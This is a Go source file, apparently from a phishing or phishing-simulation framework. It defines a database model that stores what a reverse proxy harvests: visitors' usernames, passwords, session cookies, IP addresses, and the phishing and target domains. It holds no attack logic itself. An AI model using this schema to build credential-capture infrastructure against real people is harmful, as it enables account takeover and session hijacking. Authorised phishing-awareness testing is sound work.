package database

import (
	"time"

	"github.com/google/uuid"
)

const (
	PROXY_CAPTURE_TABLE = "proxy_captures"
)

// ProxyCapture stores credentials and cookies captured by the reverse proxy
// from direct visits (without a campaign context).
type ProxyCapture struct {
	ID        *uuid.UUID `gorm:"primary_key;not null;unique;type:uuid"`
	CreatedAt *time.Time `gorm:"not null;index"`
	UpdatedAt *time.Time `gorm:"not null;index"`

	// ProxyID links back to the proxy config that captured this data.
	ProxyID *uuid.UUID `gorm:"index;type:uuid"`
	Proxy   *Proxy

	// SessionID is the proxy session identifier (IP-based).
	SessionID string `gorm:"index;default:''"`

	// IP address of the visitor.
	IPAddress string `gorm:"not null;index;default:''"`

	// UserAgent of the visitor.
	UserAgent string `gorm:"type:text;default:''"`

	// Username captured from the login form.
	Username string `gorm:"type:text;default:''"`

	// Password captured from the login form.
	Password string `gorm:"type:text;default:''"`

	// Cookies captured (JSON blob of all captured cookies).
	Cookies string `gorm:"type:text;default:''"`

	// CapturedData stores the full raw capture data as JSON.
	CapturedData string `gorm:"type:text;default:''"`

	// PhishDomain is the phishing domain the visitor accessed.
	PhishDomain string `gorm:"index;default:''"`

	// TargetDomain is the original domain being proxied.
	TargetDomain string `gorm:"index;default:''"`
}

func (ProxyCapture) TableName() string {
	return PROXY_CAPTURE_TABLE
}
